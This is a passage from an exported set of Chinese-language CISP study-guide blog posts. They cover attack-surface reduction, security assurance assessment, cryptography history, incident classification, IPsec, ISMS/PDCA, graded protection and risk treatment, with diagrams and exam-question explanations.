问题 后果 A. 直接关闭日志共享 因噎废食 无法进行集中安全分析，失去安全监控能力 B. 接受此风险 消极应对 敏感信息持续泄露，安全风险未缓解 C. 取消日志记录 过度反应 失去审计能力，无法追溯安全事件 D. 限制访问控制 ✅ 正确 保留功能同时降低风险 2.3 攻击面降低策略 降低攻击面的通用策略： graph TB A[\"攻击面降低策略\"] B[\"最小化原则\"] C[\"访问控制\"] D[\"隔离防护\"] E[\"监控审计\"] A --> B A --> C A --> D A --> E B --> B1[\"最小权限\"] B --> B2[\"最小服务\"] B --> B3[\"最小暴露\"] C --> C1[\"身份认证\"] C --> C2[\"授权管理\"] C --> C3[\"IP白名单\"] D --> D1[\"网络隔离\"] D --> D2[\"进程隔离\"] D --> D3[\"数据隔离\"] E --> E1[\"日志记录\"] E --> E2[\"实时监控\"] E --> E3[\"异常检测\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 具体实施措施： 攻击面降低实施清单： ├── 网络层面 │ ├── 关闭不必要的端口和服务 │ ├── 使用防火墙限制访问 │ ├── 实施网络分段和隔离 │ └── 使用VPN加密远程访问 ├── 应用层面 │ ├── 禁用不需要的功能 │ ├── 移除默认账户和示例代码 │ ├── 实施输入验证和输出编码 │ └── 定期更新和打补丁 ├── 访问控制 │ ├── 实施最小权限原则 │ ├── 使用强身份认证（如MFA） │ ├── IP白名单限制 │ └── 时间窗口限制 ├── 数据保护 │ ├── 加密敏感数据 │ ├── 数据脱敏处理 │ ├── 安全日志管理 │ └── 定期备份 └── 监控审计 ├── 实时监控异常行为 ├── 记录所有访问日志 ├── 定期安全审计 └── 及时响应告警 三、信息系统安全保障评估 3.1 安全保障评估概念 信息系统安全保障评估是在信息系统所处运行环境中对信息系统安全保障的具体工作和活动进行客观的评估。 安全保障评估的关键要素： graph TB A[\"安全保障评估\"] B[\"评估依据客观证据\"] C[\"评估对象安全保障工作\"] D[\"评估范围信息系统\"] E[\"评估周期生命周期\"] F[\"评估结果动态持续的信心\"] A --> B A --> C A --> D A --> E A --> F B --> B1[\"收集客观证据\"] C --> C1[\"评估安全工作\"] D --> D1[\"包含人和管理\"] E --> E1[\"覆盖全生命周期\"] F --> F1[\"提供持续信心\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#fce4ec,stroke:#c2185b 💡 安全保障评估的五个关键要素正确答案：客观证据、安全保障工作、信息系统、生命周期、动态持续 1️⃣ 通过搜集的【客观证据】 评估需要基于客观证据 不是主观判断或猜测 包括文档、记录、测试结果等 2️⃣ 向相关方提供【安全保障工作】能够实现其安全保障策略的信心 评估的是安全保障工作的有效性 验证安全策略的实施情况 确认风险降低到可接受程度 3️⃣ 评估对象是【信息系统】 不仅包括信息技术系统 还包括人员和管理 涵盖运行环境相关的所有方面 4️⃣ 涉及信息系统整个【生命周期】 从规划、设计、开发到运维、退役 不是一次性评估 需要持续关注 5️⃣ 提供一种【动态持续】的信心 安全保障是动态持续的过程 评估也应该是持续的 随着环境变化而调整 选项分析： 要素位置 选项A 选项B ✅ 选项C 选项D 第1个空 安全保障工作 客观证据 客观证据 客观证据 第2个空 客观证据 安全保障工作 安全保障工作 安全保障工作 第3个空 信息系统 信息系统 生命周期 动态持续 第4个空 生命周期 生命周期 信息系统 信息系统 第5个空 动态持续 动态持续 动态持续 生命周期 3.2 安全保障评估框架 评估框架的组成： graph LR A[\"规划阶段\"] --> B[\"实施阶段\"] B --> C[\"评估阶段\"] C --> D[\"改进阶段\"] D --> A A --> A1[\"确定评估范围\"] B --> B1[\"收集客观证据\"] C --> C1[\"分析评估结果\"] D --> D1[\"持续改进\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 评估内容： 安全保障评估内容： ├── 技术层面 │ ├── 系统架构安全性 │ ├── 安全控制措施 │ ├── 漏洞和弱点 │ └── 安全配置 ├── 管理层面 │ ├── 安全策略和制度 │ ├── 安全组织架构 │ ├── 安全管理流程 │ └── 应急响应能力 ├── 人员层面 │ ├── 安全意识水平 │ ├── 安全技能培训 │ ├── 职责分工 │ └── 行为规范 └── 运行层面 ├── 日常运维安全 ├── 变更管理 ├── 事件响应 └── 持续监控 3.3 客观证据的收集 客观证据的类型： 证据类型 说明 示例 文档证据 书面记录和文档 安全策略、操作手册、审计报告 技术证据 技术测试和检查结果 漏洞扫描报告、渗透测试结果 访谈证据 人员访谈记录 管理层访谈、员工访谈 观察证据 现场观察记录 物理安全检查、操作过程观察 日志证据 系统和应用日志 访问日志、安全事件日志 四、密码学发展历史 4.1 密码学发展四阶段 密码学发展四阶段： graph LR A[\"古典密码阶段\"] B[\"近代密码阶段\"] C[\"现代密码早期\"] D[\"现代密码近期\"] A -->|\"机械化\"| B B -->|\"理论化\"| C C -->|\"革命性\"| D A --> A1[\"替代/置换\"] B --> B1[\"Enigma密码机\"] C --> C1[\"香农理论\"] D --> D1[\"公钥密码\"] style A fill:#ffebee,stroke:#c62828 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#e3f2fd,stroke:#1976d2 4.2 各阶段详解 阶段1：古典密码阶段 📜 古典密码阶段**时期：**古代 - 19世纪末 特点： 靠直觉和技巧设计密码 不是凭借推理和证明 手工加密解密 常用方法： 替代方法（Substitution） 置换方法（Transposition） 典型密码： 凯撒密码 维吉尼亚密码 栅栏密码 阶段2：近代密码发展阶段 ⚙️ 近代密码阶段（Enigma所属阶段）**时期：**20世纪初 - 1940年代 特点： 使用机械代替手工计算 机械式密码设备 机电密码设备 标志性发明： Enigma密码机（1920年代）✅ 转轮密码机 机电密码设备 重要性： 从手工到机械的转变 提高了加密效率 二战中广泛使用 阶段3：现代密码学早期发展阶段 📊 现代密码学早期**时期：**1940年代 - 1970年代 标志： 香农的论文《保密系统的通信理论》 The Communication Theory of Secret Systems 特点： 密码学理论化 信息论基础 科学化设计 贡献： 建立密码学理论基础 完善保密性概念 引入数学证明 阶段4：现代密码学近期发展阶段 🔐 现代密码学近期**时期：**1970年代 - 至今 标志： 公钥密码思想 Diffie-Hellman密钥交换（1976） RSA算法（1977） 特点： 革命性变革 非对称加密 商业化应用 应用： 非机密单位使用 商业场合应用 互联网安全 4.3 密码学发展阶段对比 四阶段对比表： 阶段 时期 核心特征 代表技术 计算方式 古典密码 古代-19世纪 直觉和技巧 凯撒密码、维吉尼亚 手工 近代密码 20世纪初-1940s 机械/机电设备 Enigma密码机 ✅ 机械 现代早期 1940s-1970s 理论化、科学化 香农理论、DES 电子计算机 现代近期 1970s-至今 公钥密码革命 RSA、ECC 计算机 4.4 Enigma密码机详解 Enigma密码机的历史地位： Enigma密码机： ├── 发明时间：1920年代 ├── 发明者：德国发明家亚瑟·谢尔比乌斯 ├── 所属阶段：近代密码发展阶段 ✅ ├── 技术特点： │ ├── 机械式转轮密码机 │ ├── 使用多个转轮 │ ├── 每次按键转轮转动 │ └── 提供复杂的替代加密 ├── 历史意义： │ ├── 二战中德军广泛使用 │ ├── 被认为无法破解 │ ├── 最终被图灵破解 │ └── 推动了计算机发展 └── 阶段定位： ├── 不是古典密码（非手工） ├── 属于近代密码（机械设备） ├── 不是现代早期（无理论基础） └── 不是现代近期（非公钥密码） 为什么Enigma属于近代密码阶段： 💡 记忆要点判断依据： ✅ 机械化特征 使用机械转轮 代替手工计算 机电密码设备 ✅ 时间特征 1920年代发明 20世纪初期 在香农理论之前 ✅ 技术特征 机械式密码机 非手工加密 非电子计算机 4.5 密码学发展里程碑 重要里程碑事件： timeline title 密码学发展里程碑 古代 : 凯撒密码 1467 : 维吉尼亚密码 1920s : Enigma密码机（近代密码） 1945 : 香农通信理论（现代早期） 1976 : Diffie-Hellman密钥交换 1977 : RSA算法（现代近期） 1997 : AES标准 2009 : 比特币（区块链密码学） 五、总结 密码学与安全的核心要点： 密码系统安全性：由密钥决定，而非算法 Kerckhoffs原则：算法可以公开，密钥必须保密 密钥管理：覆盖生成、分发、存储、使用、更新、销毁全生命周期 攻击面降低：通过访问控制、最小化原则降低风险 安全评估：基于客观证据，评估安全保障工作，覆盖信息系统全生命周期 🎯 关键要点 密码系统的安全性由密钥决定，不是由算法决定 降低攻击面应采用访问控制，而非完全关闭功能 日志共享应限制IP地址、设置访问控制、限定访问时间 安全保障评估通过收集客观证据，评估安全保障工作 评估对象是信息系统（包括人和管理） 评估涉及信息系统整个生命周期 评估提供动态持续的信心 密码学发展四阶段：古典→近代→现代早期→现代近期 Enigma密码机属于近代密码阶段（机械/机电设备） 近代密码阶段特征：使用机械代替手工计算","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：信息安全事件与风险管理","slug":"2025/10/CISP-Incident-and-Risk-Management-zh-CN","date":"un11fin11","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Incident-and-Risk-Management/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Incident-and-Risk-Management/","excerpt":"深入解析信息安全事件分级、国家秘密定级、IPsec协议、密钥管理和风险处理方式。","text":"一、信息安全事件分级 1.1 GB/Z 20986-2007事件分级 GB/Z 20986-2007《信息安全事件分级分类指南》将信息安全事件分为四级： graph TB A[\"信息安全事件分级\"] B[\"I级特别重大事件\"] C[\"II级重大事件\"] D[\"III级较大事件\"] E[\"IV级一般事件\"] A --> B A --> C A --> D A --> E B --> B1[\"特别严重影响\"] C --> C1[\"严重影响\"] D --> D1[\"较大影响\"] E --> E1[\"一般影响\"] style B fill:#f44336,stroke:#b71c1c,color:#fff style C fill:#ff9800,stroke:#e65100 style D fill:#ffc107,stroke:#f57c00 style E fill:#4caf50,stroke:#2e7d32 1.2 事件分类 信息安全事件主要分类： 事件类型 说明 示例 有害程序事件 病毒、木马、蠕虫等恶意程序 木马感染、病毒传播 网络攻击事件 拒绝服务、入侵等攻击行为 DDoS攻击、网络入侵 信息破坏事件 信息被篡改、删除、泄露 数据删除、信息泄露 设备设施故障 硬件、软件、网络故障 服务器故障、网络中断 灾害性事件 自然灾害、事故灾难 火灾、地震 其他事件 其他影响信息安全的事件 人为破坏 1.3 事件定级判断 💡 案例分析案例：某贸易公司OA系统事件 事件描述： 系统存在漏洞被攻击者利用 传上木马病毒并删除系统数据 三个工作日的数据丢失 OA系统两天内无法访问 影响到部分业务往来公司 分析过程： 事件类型判断： 虽然有木马病毒，但主要后果是数据删除 应定性为&quot;信息破坏事件&quot;而非&quot;有害程序事件&quot; 事件等级判断： 影响范围：公司内部及部分业务往来公司 影响时间：3天数据丢失 + 2天无法访问 影响程度：一般影响，未造成严重后果 定级：IV级（一般事件） 事件定级考虑因素： 事件定级因素： ├── 影响范围 │ ├── 影响的系统数量 │ ├── 影响的用户数量 │ └── 影响的业务范围 ├── 影响程度 │ ├── 数据丢失量 │ ├── 系统中断时间 │ └── 经济损失 └── 社会影响 ├── 公共利益影响 ├── 社会秩序影响 └── 国家安全影响 四级事件对比： 等级 名称 影响程度 示例 I级 特别重大事件 特别严重影响国家安全、社会秩序 国家关键基础设施瘫痪 II级 重大事件 严重影响社会秩序和公共利益 重要信息系统大规模瘫痪 III级 较大事件 较大影响社会秩序和公共利益 重要系统部分功能受损 IV级 一般事件 一般影响，损害组织利益 企业内部系统短期中断 二、国家秘密定级与范围 2.1 国家秘密定级权限 根据《保守国家秘密法》规定，国家秘密的定级有严格的权限要求。 💡 国家秘密定级流程正确流程： 国家保密工作部门会同相关部门规定具体范围 各级国家机关、单位按照规定确定密级 不明确事项由指定的保密工作部门确定 不能由单位自行参考后报批 graph TB A[\"国家秘密定级\"] B[\"制定具体范围\"] C[\"单位确定密级\"] D[\"不明确事项处理\"] A --> B B --> C C --> D B --> B1[\"国家保密工作部门\"] B --> B2[\"会同外交、公安等部门\"] B --> B3[\"规定具体范围\"] C --> C1[\"各级国家机关\"] C --> C2[\"按照规定确定\"] D --> D1[\"指定保密部门确定\"] D --> D2[\"不能自行参考后报批\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 2.2 国家秘密定级的正确做法 国家秘密定级流程对比： 步骤 正确做法 错误做法 说明 制定范围 国家保密工作部门会同相关部门规定 单位自行制定 ✅ 符合法律 确定密级 各级国家机关按照规定确定 单位自行决定 ✅ 符合法律 不明确事项 由指定保密部门确定 单位自行参考后报批 ❌ 不符合法律 ⚠️ 关键错误不能由单位自行参考后报批： ❌ 错误：对于不明确的事项，单位自行参考国家要求确定和定级，然后报国家保密工作部门确定 ✅ 正确：应直接由指定的保密工作部门确定，不能先自行定级 2.3 指定的保密工作部门 有权确定不明确事项的部门： 指定保密工作部门： ├── 国家保密工作部门 ├── 省、自治区、直辖市的保密工作部门 ├── 省、自治区政府所在地的市的保密工作部门 ├── 经国务院批准的较大的市的保密工作部门 └── 国家保密工作部门审定的机关 三、IPsec协议安全 3.1 IPsec模式 IPsec（Internet Protocol Security）提供两种工作模式：传输模式和隧道模式。 graph TB A[\"IPsec工作模式\"] B[\"传输模式Transport Mode\"] C[\"隧道模式Tunnel Mode\"] A --> B A --> C B --> B1[\"保护IP负载\"] B --> B2[\"IP头不加密\"] B --> B3[\"端到端\"] C --> C1[\"保护整个IP包\"] C --> C2[\"包括IP头\"] C --> C3[\"网关到网关\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d 3.2 IPsec协议组成 IPsec主要协议： 协议 全称 功能 支持模式 AH Authentication Header 认证、完整性 传输模式、隧道模式 ESP Encapsulating Security Payload 认证、完整性、加密 传输模式、隧道模式 💡 IPsec安全服务IPsec提供的安全服务： ✅ 可认证性：验证数据来源 ✅ 保密性：加密数据 ✅ 完整性：防止数据篡改 ✅ 防重放：防止重放攻击 ⚠️ 常见错误IPsec不仅仅保证认证性和保密性： ❌ 错误：IPsec仅能保证传输数据的可认证性和保密性 ✅ 正确：IPsec还提供完整性和防重放保护 3.3 IPsec工作模式对比 传输模式 vs 隧道模式： graph LR A[\"原始IP包\"] B[\"传输模式\"] C[\"隧道模式\"] A --> B A --> C B --> B1[\"IP头 | IPsec头 | 加密负载\"] B --> B2[\"保护负载\"] C --> C1[\"新IP头 | IPsec头 | 加密原IP包\"] C --> C2[\"保护整个IP包\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d 四、ISMS管理层职责 4.1 信息安全方针的制定与颁布 在组织中，信息安全方针的制定和颁布有明确的职责划分。 💡 方针制定职责正确做法： ✅ 由组织的管理层制定并颁布 ✅ 为组织的ISMS建设指明方向 ✅ 提供总体纲领，明确总体要求 错误做法： ❌ 由信息技术责任部门（如信息中心）制定并颁布 graph TB A[\"信息安全方针\"] B[\"管理层职责\"] C[\"IT部门职责\"] A --> B A --> C B --> B1[\"✅ 制定并颁布方针\"] B --> B2[\"✅ 确定战略方向\"] B --> B3[\"✅ 提供资源支持\"] C --> C1[\"✅ 实施技术措施\"] C --> C2[\"✅ 执行安全策略\"] C --> C3[\"❌ 不制定方针\"] style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 4.2 管理层的ISMS职责 管理层在ISMS中的关键职责： 职责 说明 重要性 制定方针 制定并颁布信息安全方针 战略层面 确保目标 确保ISMS目标和计划得以制定 明确、可度量 传达要求 将安全目标、方针传达全组织 全员覆盖 风险管理 了解风险，决定可接受级别 风险决策 五、保密法三同步原则 5.1 涉密信息系统三同步 《保密法》第二十条规定了涉密信息系统的三同步原则。 💡 三同步原则涉密信息系统保密设施、设备应当： 与涉密信息系统同步规划 与涉密信息系统同步建设 与涉密信息系统同步运行 涉密信息系统管理要点： 要点 内容 说明 分级保护 按照涉密程度实行分级保护 根据秘密等级 保密设施 按照国家保密标准配备 必须符合标准 三同步 规划、建设、运行同步 不能事后补救 检查合格 经检查合格后方可投入使用 强制要求 六、密钥管理 6.1 密钥管理原则 密钥管理是密码系统安全的核心，需要遵循科克霍夫原则。 ⚠️ 会话密钥重用风险错误做法： ❌ 保密通信过程中，使用之前用过的会话密钥建立会话 这会严重影响通信安全 正确做法： ✅ 每次会话使用新的会话密钥 ✅ 会话密钥用完即销毁 ✅ 不重复使用会话密钥 6.2 密钥生命周期管理 密钥管理需要考虑的环节： 密钥生命周期： ├── 密钥产生 │ ├── 随机数生成 │ └── 密钥生成算法 ├── 密钥存储 │ ├── 安全存储介质 │ └── 加密保护 ├── 密钥备份 │ ├── 备份策略 │ └── 恢复机制 ├── 密钥分配 │ ├── 安全传输 │ └── 密钥协商（如Diffie-Hellman） ├── 密钥更新 │ ├── 定期更换 │ └── 按需更新 └── 密钥撤销 ├── 撤销机制 └── 密钥销毁 七、风险处理方式 7.1 四种风险处理方式 风险处理有四种基本方式，需要根据具体情况选择。 graph TB A[\"风险处理方式\"] B[\"风险降低\"] C[\"风险规避\"] D[\"风险转移\"] E[\"风险接受\"] A --> B A --> C A --> D A --> E B --> B1[\"实施安全控制\"] B --> B2[\"降低风险概率\"] C --> C1[\"停止风险活动\"] C --> C2[\"关闭服务\"] D --> D1[\"购买保险\"] D --> D2[\"外包\"] E --> E1[\"接受残余风险\"] E --> E2[\"成本考虑\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 7.2 风险处理方式案例 💡 案例分析：关闭FTP服务场景： 服务器A的FTP服务存在高风险漏洞 处理措施：关闭FTP服务 分析： 这属于风险规避 通过停止风险活动来消除风险 不是风险降低（降低是实施控制措施） 风险处理方式对比： 方式 定义 示例 适用场景 风险降低 实施控制措施降低风险 打补丁、加固配置 需要保留服务 风险规避 停止或避免风险活动 关闭服务、停止业务 风险过高且可停止 风险转移 将风险转移给第三方 购买保险、外包 有转移渠道 风险接受 接受残余风险 成本过高时接受 风险可接受 八、总结 🎯 关键要点信息安全事件： 事件分四级：I级（特别重大）、II级（重大）、III级（较大）、IV级（一般） 事件分类看主要后果：数据删除属于信息破坏事件 定级综合考虑影响范围、程度和社会影响 国家秘密定级： 国家秘密定级由指定部门确定，不能自行参考后报批 定级流程：制定范围→单位确定→不明确事项由指定部门确定 指定保密工作部门有明确的层级和权限 IPsec协议安全： 传输模式保护IP负载，隧道模式保护整个IP包 AH和ESP都能以传输模式工作 IPsec提供认证、保密、完整性和防重放保护 ISMS管理层职责： 信息安全方针由管理层制定并颁布，不是IT部门 管理层确保ISMS目标和计划得以制定 管理层全面了解风险，决定可接受级别 保密法三同步： 涉密信息系统实行三同步：同步规划、同步建设、同步运行 涉密系统按涉密程度实行分级保护 经检查合格后方可投入使用 密钥管理： 安全性基于密钥，不是算法（科克霍夫原则） 不能重用会话密钥，会影响通信安全 密钥管理涉及产生、存储、备份、分配、更新、撤销 风险处理方式： 四种方式：降低、规避、转移、接受 关闭服务属于风险规避，不是风险降低 风险降低是实施控制措施 💡 实践建议 建立完善的事件分级响应机制 严格遵守国家秘密定级流程 正确配置IPsec保护网络通信 实施科学的密钥管理策略 根据实际情况选择合适的风险处理方式","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：信息安全管理体系与标准","slug":"2025/10/CISP-ISMS-and-Standards-zh-CN","date":"un11fin11","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-ISMS-and-Standards/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-ISMS-and-Standards/","excerpt":"深入解析信息安全工程、ISMS管理体系、等级保护发展历程和P2DR模型。","text":"一、信息安全工程 1.1 信息安全工程的正确理念 💡 信息安全工程的核心原则同步规划、同步建设： 在规划阶段合理规划信息安全 在建设阶段同步实施信息安全建设 安全与功能并重，不可偏废 graph TB A[\"信息化建设\"] B[\"规划阶段\"] C[\"建设阶段\"] D[\"运行阶段\"] A --> B A --> C A --> D B --> B1[\"✅ 规划信息安全\"] B --> B2[\"✅ 安全需求分析\"] B --> B3[\"✅ 安全架构设计\"] C --> C1[\"✅ 同步实施安全建设\"] C --> C2[\"✅ 安全功能开发\"] C --> C3[\"✅ 安全测试\"] D --> D1[\"✅ 安全运维\"] D --> D2[\"✅ 持续改进\"] style B1 fill:#e8f5e9,stroke:#388e3d style C1 fill:#e8f5e9,stroke:#388e3d style D1 fill:#e8f5e9,stroke:#388e3d 1.2 信息安全工程的常见误区 ❌ 错误做法误区一：功能优先论 ❌ 认为系统功能实现是最重要的 ✅ 正确：功能与安全同等重要 误区二：事后加固论 ❌ 先实施系统，而后对系统进行安全加固 ✅ 正确：同步规划、同步建设 误区三：安全无关论 ❌ 信息化建设没有必要涉及信息安全建设 ✅ 正确：信息安全是信息化建设的重要组成部分 信息安全工程理念对比： 做法 描述 是否正确 问题 功能优先 系统功能实现最重要 ❌ 忽视安全重要性 事后加固 先建系统后加固 ❌ 成本高、效果差 同步建设 规划和建设阶段同步实施安全 ✅ 正确做法 安全无关 不涉及信息安全建设 ❌ 完全错误 二、信息安全管理体系（ISMS） 2.1 ISMS的PDCA模型 GB/T 22080-2008《信息技术 安全技术 信息安全管理体系 要求》指出，建立信息安全管理体系应参照PDCA模型进行。 graph TB A[\"ISMS PDCA模型\"] B[\"Plan建立ISMS\"] C[\"Do实施和运行ISMS\"] D[\"Check监视和评审ISMS\"] E[\"Act保持和改进ISMS\"] A --> B B --> C C --> D D --> E E --> B B --> B1[\"制定ISMS方针\"] B --> B2[\"风险评估\"] B --> B3[\"选择控制措施\"] C --> C1[\"实施控制措施\"] C --> C2[\"培训和意识教育\"] C --> C3[\"运行管理\"] D --> D1[\"监控和测量\"] D --> D2[\"内部审核\"] D --> D3[\"有效性测量\"] E --> E1[\"纠正措施\"] E --> E2[\"预防措施\"] E --> E3[\"持续改进\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 2.2 ISMS各阶段的工作内容 PDCA各阶段详细活动： 阶段 名称 主要活动 关键输出 Plan 建立ISMS 制定ISMS方针、风险评估、选择控制措施 ISMS方针、风险评估报告 Do 实施和运行ISMS 实施控制措施、培训和意识教育、运行管理 控制措施实施记录 Check 监视和评审ISMS 监控和测量、内部审核、有效性测量、管理评审 审核报告、评审报告 Act 保持和改进ISMS 纠正措施、预防措施、持续改进 改进计划 ⚠️ 注意区分内部审核属于Check阶段，不是Act阶段： ✅ &quot;实施内部审核&quot;是监视和评审ISMS阶段（Check）的工作内容 ❌ 不是保持和改进ISMS阶段（Act）的工作内容 Act阶段主要是根据Check阶段发现的问题采取纠正和预防措施 2.3 ISO 27001控制措施范围 💡 ISO 27001常规控制措施若一个组织声称自己的ISMS符合ISO/IEC 27001或GB/T 22080标准要求，其信息安全控制措施通常在以下方面实施常规措施： 包括的控制领域： ✅ 信息安全方针 ✅ 信息安全组织 ✅ 资产管理 ✅ 人力资源安全 ✅ 物理和环境安全 ✅ 通信和操作管理（通信安全） ✅ 访问控制 ✅ 信息系统获取、开发与维护 ✅ 安全事件管理 ✅ 业务连续性管理 ✅ 符合性（合规性） ✅ 供应商关系 不属于控制措施范围： ❌ 规划与建立ISMS（这是PDCA的Plan阶段，不是控制措施） ❌ 业务安全性审计（不是标准控制领域） 2.4 ISO 27001资产管理控制措施 若组织声称其ISMS符合ISO/IEC 27001或GB/T 22080标准要求，需要在资产管理方面实施常规控制。 graph TB A[\"资产管理\"] B[\"对资产负责\"] C[\"信息分类\"] A --> B A --> C B --> B1[\"资产清单\"] B --> B2[\"资产责任人\"] B --> B3[\"资产可接受使用\"] C --> C1[\"分类指南\"] C --> C2[\"信息标记\"] C --> C3[\"信息处理\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d 资产管理的两个控制目标： 控制目标 目的 控制措施 对资产负责 识别组织资产并明确保护责任 资产清单、资产责任人、资产的可接受使用 信息分类 确保信息受到适当级别的保护 分类指南、信息的标记和处理 2.5 ISMS管理层职责 在组织中，信息安全方针的制定和颁布有明确的职责划分。 💡 方针制定职责正确做法： ✅ 由组织的管理层制定并颁布 ✅ 为组织的ISMS建设指明方向 ✅ 提供总体纲领，明确总体要求 错误做法： ❌ 由信息技术责任部门（如信息中心）制定并颁布 管理层在ISMS中的关键职责： 职责 说明 重要性 制定方针 制定并颁布信息安全方针 战略层面 确保目标 确保ISMS目标和计划得以制定 明确、可度量 传达要求 将安全目标、方针传达全组织 全员覆盖 风险管理 了解风险，决定可接受级别 风险决策 三、等级保护政策发展历程 3.1 等级保护发展时间线 我国等级保护政策的发展经历了以下阶段： timeline title 等级保护政策发展历程 1994 : 思想提出 : 计算机系统安全保护等级划分思想提出 1999-2003 : 试点阶段 : 等级保护工作试点 2003-2007 : 政策颁布 : 等级保护相关政策文件颁布 2007-2008 : 标准发布 : 等级保护相关标准发布 2017 : 法律确立 : 网络安全法将等级保护制度作为基本策略 3.2 等级保护发展的正确顺序 💡 等级保护发展五个阶段正确顺序：②⑤①③④ ② 计算机系统安全保护等级划分思想提出（1994年） 《计算机信息系统安全保护等级划分准则》（GB 17859-1999）的前身 ⑤ 等级保护工作试点（1999-2003年） 在部分地区和行业开展试点工作 ① 等级保护相关政策文件颁布（2003-2007年） 中办发[2003]27号文件 《信息安全等级保护管理办法》（2007年） ③ 等级保护相关标准发布（2007-2008年） 等级保护系列标准陆续发布 ④ 网络安全法将等级保护制度作为基本策略（2017年） 《中华人民共和国网络安全法》正式实施 发展历程关键节点： 时间 阶段 关键事件 意义 1994年 思想提出 等级划分思想提出 理论基础 1999-2003年 试点 开展试点工作 实践探索 2003年 政策颁布 中办发[2003]27号 政策确立 2007-2008年 标准发布 系列标准发布 标准体系 2017年 法律确立 网络安全法实施 法律保障 四、P2DR模型 4.1 PDR模型与P2DR模型对比 PDR模型： Protection（防护） Detection（检测） Response（响应） P2DR模型： Policy（策略） Protection（防护） Detection（检测） Response（响应） graph TB A[\"P2DR模型\"] B[\"Policy策略\"] C[\"Protection防护\"] D[\"Detection检测\"] E[\"Response响应\"] A --> B B --> C B --> D B --> E C --> D D --> E E --> C B --> B1[\"安全策略\"] B --> B2[\"指导方针\"] C --> C1[\"防护措施\"] D --> D1[\"漏洞监测\"] E --> E1[\"响应处置\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 4.2 P2DR模型的核心特点 💡 P2DR模型的四个强调与PDR模型相比，P2DR模型更强调： 控制和对抗 主动的安全控制 与威胁的对抗能力 动态性 强调系统安全的动态性 持续的安全保障过程 漏洞监测 以安全检测为核心 及时发现安全漏洞 网络安全 提高网络安全整体水平 自适应填充&quot;安全间隙&quot; P2DR模型的循环机制： P2DR循环： 策略（Policy） ↓ 防护（Protection） ↓ 检测（Detection）← 漏洞监测 ↓ 响应（Response）← 控制和对抗 ↓ 改进防护 ← 动态性 ↓ （循环继续） ⚠️ 完整答案记忆与PDR模型相比，P2DR模型则更强调控制和对抗，即强调系统安全的动态性，并且以安全检测、漏洞监测和自适应填充&quot;安全间隙&quot;为循环来提高网络安全。 五、总结 🎯 关键要点信息安全工程： 信息安全工程要在规划阶段合理规划，建设阶段同步实施 不能先实施系统后加固，更不能忽视安全建设 安全与功能并重，不可偏废 ISMS管理体系： ISMS遵循PDCA模型：Plan-Do-Check-Act 制定ISMS方针是Plan阶段工作 实施培训和意识教育是Do阶段工作 进行有效性测量和内部审核是Check阶段工作 ISO 27001资产管理包括对资产负责和信息分类 信息安全方针由管理层制定并颁布，不是IT部门 等级保护发展： 等级保护发展顺序：思想提出→试点→政策→标准→法律 1994年思想提出，2017年法律确立 经历了理论、实践、政策、标准、法律五个阶段 P2DR模型： P2DR模型强调控制和对抗、动态性、漏洞监测、网络安全 P2DR通过检测-监测-响应循环填充安全间隙 比PDR模型增加了Policy（策略）要素 💡 实践建议 在信息化建设初期就规划安全 建立完善的ISMS管理体系 遵循PDCA持续改进 实施P2DR动态防御策略 定期评估和优化安全措施","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：信息安全等级保护基础","slug":"2025/10/CISP-Information-Security-Level-Protection-Basics-zh-CN","date":"un11fin11","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Information-Security-Level-Protection-Basics/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Information-Security-Level-Protection-Basics/","excerpt":"深入解析等级保护制度、IATF框架、安全培训管理和CC标准的核心知识点。","text":"一、信息安全政策文件体系 1.1 核心政策文件 📋 国家信息安全保障工作的纲领性文件《国家信息化领导小组关于加强信息安全保障工作的意见》（中办发[2003]27号）明确了我国信息安全保障工作的方针和总体要求以及加强信息安全保障工作的主要原则。 核心政策文件对比： 文件名称 发布机构 主要内容 地位 《国家信息化领导小组关于加强信息安全保障工作的意见》 中办 方针、总体要求、主要原则 ✅ 纲领性文件 